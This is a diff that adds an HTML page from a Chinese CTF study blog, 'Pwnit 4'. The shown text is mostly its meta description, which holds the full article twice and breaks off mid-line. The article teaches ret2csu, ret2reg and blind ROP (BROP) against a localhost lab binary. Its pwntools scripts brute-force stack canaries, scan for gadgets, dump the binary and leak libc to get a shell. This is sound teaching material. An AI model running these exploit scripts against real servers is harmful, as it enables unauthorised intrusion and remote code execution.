@@ -1,0 +1,1184 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.17.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Pwnit 4  -  My way, though far away</title>
+<meta name="description" content="  pwn学习资料，来自ctf-wiki。中级 ROPret2csu在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)  从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。  从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。  从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。# r12(r13, r14, r15) -&gt; retdef csu(offset, r12, r13, r14, r15, ret, rbx = 0, rbp = 1):  csu_first = 0x04011ea  csu_second = 0x04011d0  # First step  # pop rbx, rbp, r12, r13, r14, r15        # Second step    # rdx = r15    # rsi = r14    # rdi = edi = r13d    # rbx = 0, rbp = 1    # call r12	payload = &#39;a&#39; * offset + p64(csu_first)	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)	payload += p64(csu_second)	payload += &#39;b&#39; * 0x38	payload += p64(ret)	s.sendline(payload)	sleep(0.5)def main():	s.recv()	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, elf.sym[&#39;main&#39;])	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))		s.recv()	s.sendline(flat([cyclic(136), libc.address + 0x45254], 0,0,0,0,0,0,0))	#s.recv()	s.interactive()在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件  漏洞可以被多次触发  在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器  利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。  利用中间部分的代码控制了 rdx，rsi，edi。ret2reg  查看溢出函返回时哪个寄存值指向溢出缓冲区空间  然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址  reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)BROPBROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。  源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。  服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。在 BROP 中，基本的遵循的思路如下  判断栈溢出长度          暴力枚举        Stack Reading          获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。        Blind ROP          找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。        Build the exploit          利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。      栈溢出长度首先检测输入长度来进行栈溢出。def getBufferLength():    i = 1    while True:        try:            p = remote(&#39;127.0.0.1&#39;, 1111)            p.recvuntil(&#39;\n&#39;)            p.send(i * &#39;a&#39;)            output = p.recv()            p.close()            if not output.startswith(&#39;No password&#39;):                return i - 1            else:                i += 1        except EOFError:            p.close()            return i - 1print getBufferLength()canary保护然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：for i in xrange(256):    s = remote(&#39;127.0.0.1&#39;, 1234)	s.recv()	# offset = 50	payload = &quot;a&quot;*50+&#39;\x00&#39;+chr(i)	s.send(payload)	try:		print i		out = s.recv()	except EOFError:		s.close()	else:		print out		print &#39;*&#39;*8+ hex(i)+ &#39;*&#39;*8		s.close()在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。pop rdi; ret # socketpop rsi; ret # bufferpop rdx; ret # lengthpop rax; ret # write syscall numbersyscall但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。寻找 GADGETS首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。  程序直接崩溃  程序运行一段时间后崩溃  程序一直运行而并不崩溃为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为stop gadget，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。检测代码如下：# log in filedef log_in_file(addr):    f = open(&#39;gadget.txt&#39;,&#39;a&#39;)    f.write(&quot;gadget addr : %#x\n&quot; % addr)    f.close()def get_hang_addr(addr):    p = remote(&#39;127.0.0.1&#39;,1111)    payload = &quot;A&quot; * 72 + p64(addr)    p.recvuntil(&#39;\n&#39;)    p.send(payload)    try:        output = p.recv()        log.info(&quot;alive ! at 0x%x&quot; % addr)        log_in_file(addr)        p.close()    except EOFError as e:         p.close()        log.info(&quot;dead connection! at 0x%x&quot; % addr)    else:    	p.close()    	log.info(&quot;else at 0x%x&quot; % addr)addr = 0x00400000while True:	get_hang_addr(addr)	addr+=1不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。这里论文中定义了3种状态：  Probe 探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。  Stop ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。  Trap stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。我们可以通过在栈上摆放不同顺序的Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子  probe,stop,traps(traps,traps,…)          我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如                  ret          xor eax,eax; ret                      probe,trap,stop,traps          我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如                  pop rax; ret          pop rdi; ret                      probe, trap, trap, trap, trap, trap, trap, stop, traps          我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，这里一般来说会遇到两处比较有意思的地方                  plt 处不会崩，，          _start 处不会崩，相当于程序重新执行。                    # get ret2csu_addrdef get_gadgets_addr(stop_gadget):	address = 0x400750	while True:		p = remote(&#39;127.0.0.1&#39;,1111)		payload = &quot;A&quot; * 72 + p64(address) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)		p.recvuntil(&#39;\n&#39;)		p.send(payload)		try:		    output = p.recv()		    log.info(&quot;find gadgets at 0x%x&quot; % address)		    p.close()		    return		except EOFError as e: 		    address += 1		    p.close()		    log.info(&quot;dead connection! at 0x%x&quot; % address)		p.close()		    get_gadgets_addr(0x004006ad)到这里我们就确定了stop gadget 和 ret2csu的地址。寻找plt如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。ppppppr_addr = 0x4007aagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addrpop_rid_ret = ppppppr_addr + 9stop_gadget = 0x004006ad# get puts@pltdef get_puts_addr(length, rdi_ret, stop_gadget):    addr = 0x400000    while 1:        print hex(addr)        sh = remote(&#39;127.0.0.1&#39;, 1111)        sh.recvuntil(&#39;\n&#39;)        payload = &#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)        sh.send(payload)        try:            content = sh.recv()            if content.startswith(&#39;\x7fELF&#39;):                print &#39;find puts@plt addr: 0x%x&#39; % addr                return hex(addr)            sh.close()            addr += 1        except Exception as e:            sh.close()            addr += 1print get_puts_addr(72, pop_rid_ret, stop_gadget)#puts_plt = 0x400560在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。0x4005550x4005570x40055c0x40055e0x40055f0x4005600x4005610x400566  在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。  在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。dump文件在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下：# dump filedef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):    sh = remote(&#39;127.0.0.1&#39;, 1111)    payload = &#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)    sh.recvuntil(&#39;\n&#39;)    sh.send(payload)    try:        data = sh.recv()        sh.close()        try:            data = data[:data.index(&quot;WelCome&quot;)]        except Exception:            data = data        #print len(data)        if data == &quot;&quot;:            data = &#39;\x00&#39;        return data    except Exception:        sh.close()        return Nonelength = 72brop_gadget = 0x4007aastop_gadget = 0x4006ADputs_plt = 0x400560addr = 0x400500rdi_ret = brop_gadget + 9result = &quot;&quot;while addr &lt; 0x400600:    print hex(addr)    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)    if data is None:        continue    else:    	if data == &#39;\x0a&#39;:    		data = &#39;\x00&#39;        result += data    addr += len(data)with open(&#39;code&#39;, &#39;wb&#39;) as f:    f.write(result)这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。exploit#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from sys import *import osip = &#39;127.0.0.1&#39; port = 1111context.log_level = &#39;debug&#39;context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = remote(ip,port)elf = ELF(&quot;./brop&quot;)libc = elf.libc#length = getbufferflow_length()length = 72#stop_gadget = get_stop_addr(length)stop_gadget = 0x4006ad#ppppppr_addr = find_brop_gadget(length, stop_gadget)ppppppr_addr = 0x4007aagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1ardi_ret = ppppppr_addr + 9#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560# puts_got = 0x601018puts_got = 0x601018#s = gdb.debug(&#39;./brop&#39;,&#39;&#39;&#39;#b main#&#39;&#39;&#39;)s.recv()payload = &#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)s.send(payload)puts_addr = u64(s.recv(6).ljust(8, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc address -&gt; {:#x}&quot;.format(libc.address))s.recv()payload = &#39;a&#39; * length +  p64(libc.address+0x45254) + p64(0) * 7s.send(payload)#s.recv()s.interactive()">
+
+
+  <meta name="author" content="zjgcjy">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="My way, though far away">
+<meta property="og:title" content="Pwnit 4">
+<meta property="og:url" content="http://localhost:4000/posts/2019-03/Pwnit-4.html">
+
+
+  <meta property="og:description" content="  pwn学习资料，来自ctf-wiki。中级 ROPret2csu在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)  从+90 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。  从 +64 到 +70，我们可以将 r15 赋给 rdx, 将 r14 赋给 rsi，将 r13d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。  从 +77 到 +86，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 == rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。这个题就是个简单的栈溢出，但是要ret2libc的话，需要leak info，由于只有read和write函数，x64位下用write来打印GOT表需要3个参数，这就要我们控制rdi，rsi和rdx。而我们用rop工具并不能找到这么多gadget。所以我们可以使用lib2csu来控制regs，继而ret2libc。脚本如下，csu用来进行ret2csu，参数用于glibc2.28，其实和一般的ret2libc差不多，区别是没有用来rdx的gadget。# r12(r13, r14, r15) -&gt; retdef csu(offset, r12, r13, r14, r15, ret, rbx = 0, rbp = 1):  csu_first = 0x04011ea  csu_second = 0x04011d0  # First step  # pop rbx, rbp, r12, r13, r14, r15        # Second step    # rdx = r15    # rsi = r14    # rdi = edi = r13d    # rbx = 0, rbp = 1    # call r12	payload = &#39;a&#39; * offset + p64(csu_first)	payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)	payload += p64(csu_second)	payload += &#39;b&#39; * 0x38	payload += p64(ret)	s.sendline(payload)	sleep(0.5)def main():	s.recv()	csu(136, elf.got[&#39;write&#39;], 1, elf.got[&#39;write&#39;], 8, elf.sym[&#39;main&#39;])	libc.address = u64(s.recv(8)) - libc.symbols[&#39;write&#39;]	log.success(&quot;libc.address -&gt; {:#x}&quot;.format(libc.address))		s.recv()	s.sendline(flat([cyclic(136), libc.address + 0x45254], 0,0,0,0,0,0,0))	#s.recv()	s.interactive()在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法改进 1 - 提前控制 RBX 与 RBP：可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。改进 2 - 多次利用：其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件  漏洞可以被多次触发  在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。总结一下，在上面的 libc_csu_init 中我们主要利用了以下寄存器  利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。  利用中间部分的代码控制了 rdx，rsi，edi。ret2reg  查看溢出函返回时哪个寄存值指向溢出缓冲区空间  然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址  reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)BROPBROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。  源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。  服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。在 BROP 中，基本的遵循的思路如下  判断栈溢出长度          暴力枚举        Stack Reading          获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。        Blind ROP          找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。        Build the exploit          利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。      栈溢出长度首先检测输入长度来进行栈溢出。def getBufferLength():    i = 1    while True:        try:            p = remote(&#39;127.0.0.1&#39;, 1111)            p.recvuntil(&#39;\n&#39;)            p.send(i * &#39;a&#39;)            output = p.recv()            p.close()            if not output.startswith(&#39;No password&#39;):                return i - 1            else:                i += 1        except EOFError:            p.close()            return i - 1print getBufferLength()canary保护然后要绕过canary的保护，这里就采用爆破的方式，由于canary的最低为都是0，32位程序只要爆破256*3次就行了。代码如下，没运行过，应该没问题：for i in xrange(256):    s = remote(&#39;127.0.0.1&#39;, 1234)	s.recv()	# offset = 50	payload = &quot;a&quot;*50+&#39;\x00&#39;+chr(i)	s.send(payload)	try:		print i		out = s.recv()	except EOFError:		s.close()	else:		print out		print &#39;*&#39;*8+ hex(i)+ &#39;*&#39;*8		s.close()在爆破完canary之后，我们就要控制返回地址来泄露整个程序，一般通过wrtie和puts函数，而puts会截断，write函数需要的参数又多，两者都不简单，这里使用write函数进行介绍，而最简单的执行 write 函数的方法就是构造系统调用。pop rdi; ret # socketpop rsi; ret # bufferpop rdx; ret # lengthpop rax; ret # write syscall numbersyscall但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为找 write 的方式来获取。write函数一般可以在plt表中找到，三个参数rdi，rsi，rdx的前两个可以在libc2csu中，而在程序中rdx一般不为0，因为这个参数是用来输出长度的。所以我们先要进行寻找gadgets，然后再去寻找plt表中的各个函数。寻找 GADGETS首先，我们来想办法寻找 gadgets。此时，由于不知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的 gadgets。而当我们控制程序的返回地址时，一般有以下几种情况。  程序直接崩溃  程序运行一段时间后崩溃  程序一直运行而并不崩溃为了寻找合理的 gadgets，我们首先要找到一个可以使程序保持一个状态的地址，称为stop gadget，当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。他的意思就如下图所示，当我们在进行gadget测试时候，假如我们测试到了gadget，ret指令会将栈中的地址作为返回地址，也就是说，如果我们不在进行测试的gadget后面附上stop gadget，程序的运行状态是不可知的，我们必须使用一个可控的程序状态。比如说再次跳转到主函数，这样我们又能重复这一次gadget的测试操作，进而找到我们需要的gadget。检测代码如下：# log in filedef log_in_file(addr):    f = open(&#39;gadget.txt&#39;,&#39;a&#39;)    f.write(&quot;gadget addr : %#x\n&quot; % addr)    f.close()def get_hang_addr(addr):    p = remote(&#39;127.0.0.1&#39;,1111)    payload = &quot;A&quot; * 72 + p64(addr)    p.recvuntil(&#39;\n&#39;)    p.send(payload)    try:        output = p.recv()        log.info(&quot;alive ! at 0x%x&quot; % addr)        log_in_file(addr)        p.close()    except EOFError as e:         p.close()        log.info(&quot;dead connection! at 0x%x&quot; % addr)    else:    	p.close()    	log.info(&quot;else at 0x%x&quot; % addr)addr = 0x00400000while True:	get_hang_addr(addr)	addr+=1不放心的话，我们可以对检测出来的gadget进行手工检测，一般都选用靠近主函数入口的地址，这样可以让程序再运行一次。这里论文中定义了3种状态：  Probe 探针，位于ret地址处，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。  Stop ret地址后面经过预期几个gadget处的位置，不会使得程序崩溃的 stop gadget 的地址。  Trap stop gadget之前和之后的部分填充的内容，可以导致程序崩溃的地址。我们可以通过在栈上摆放不同顺序的Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子  probe,stop,traps(traps,traps,…)          我们通过程序崩溃与否 ，可以找到不会对栈进行 pop 操作的 gadget，如                  ret          xor eax,eax; ret                      probe,trap,stop,traps          我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如                  pop rax; ret          pop rdi; ret                      probe, trap, trap, trap, trap, trap, trap, stop, traps          我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的，，这里一般来说会遇到两处比较有意思的地方                  plt 处不会崩，，          _start 处不会崩，相当于程序重新执行。                    # get ret2csu_addrdef get_gadgets_addr(stop_gadget):	address = 0x400750	while True:		p = remote(&#39;127.0.0.1&#39;,1111)		payload = &quot;A&quot; * 72 + p64(address) + p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) + p64(stop_gadget)		p.recvuntil(&#39;\n&#39;)		p.send(payload)		try:		    output = p.recv()		    log.info(&quot;find gadgets at 0x%x&quot; % address)		    p.close()		    return		except EOFError as e: 		    address += 1		    p.close()		    log.info(&quot;dead connection! at 0x%x&quot; % address)		p.close()		    get_gadgets_addr(0x004006ad)到这里我们就确定了stop gadget 和 ret2csu的地址。寻找plt如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。ppppppr_addr = 0x4007aagadget2 = ppppppr_addr - 0x1agadget1 = ppppppr_addrpop_rid_ret = ppppppr_addr + 9stop_gadget = 0x004006ad# get puts@pltdef get_puts_addr(length, rdi_ret, stop_gadget):    addr = 0x400000    while 1:        print hex(addr)        sh = remote(&#39;127.0.0.1&#39;, 1111)        sh.recvuntil(&#39;\n&#39;)        payload = &#39;A&#39; * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)        sh.send(payload)        try:            content = sh.recv()            if content.startswith(&#39;\x7fELF&#39;):                print &#39;find puts@plt addr: 0x%x&#39; % addr                return hex(addr)            sh.close()            addr += 1        except Exception as e:            sh.close()            addr += 1print get_puts_addr(72, pop_rid_ret, stop_gadget)#puts_plt = 0x400560在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。0x4005550x4005570x40055c0x40055e0x40055f0x4005600x4005610x400566  在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。  在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。dump文件在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下：# dump filedef leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):    sh = remote(&#39;127.0.0.1&#39;, 1111)    payload = &#39;a&#39; * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)    sh.recvuntil(&#39;\n&#39;)    sh.send(payload)    try:        data = sh.recv()        sh.close()        try:            data = data[:data.index(&quot;WelCome&quot;)]        except Exception:            data = data        #print len(data)        if data == &quot;&quot;:            data = &#39;\x00&#39;        return data    except Exception:        sh.close()        return Nonelength = 72brop_gadget = 0x4007aastop_gadget = 0x4006ADputs_plt = 0x400560addr = 0x400500rdi_ret = brop_gadget + 9result = &quot;&quot;while addr &lt; 0x400600:    print hex(addr)    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)    if data is None:        continue    else:    	if data == &#39;\x0a&#39;:    		data = &#39;\x00&#39;        result += data    addr += len(data)with open(&#39;code&#39;, &#39;wb&#39;) as f:    f.write(result)这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。exploit#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from sys import *import osip = &#39;127.0.0.1&#39; port = 1111context.log_level = &#39;debug&#39;context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = remote(ip,port)elf = ELF(&quot;./brop&quot;)libc = elf.libc#length = getbufferflow_length()length = 72#stop_gadget = get_stop_addr(length)stop_gadget = 0x4006ad#ppppppr_addr = find_brop_gadget(length, stop_gadget)ppppppr_addr = 0x4007aagadget1 = ppppppr_addrgadget2 = ppppppr_addr - 0x1ardi_ret = ppppppr_addr + 9#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560# puts_got = 0x601018puts_got = 0x601018#s = gdb.debug(&#39;./brop&#39;,&#39;&#39;&#39;#b main#&#39;&#39;&#39;)s.recv()payload = &#39;a&#39; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)s.send(payload)puts_addr = u64(s.recv(6).ljust(8, &#39;\x00&#39;))log.success(&quot;puts_addr -&gt; {:#x}&quot;.format(puts_addr))libc.address = puts_addr - libc.symbols[&#39;puts&#39;]log.success(&quot;libc address -&gt; {:#x}&quot;.format(libc.address))s.recv()payload = 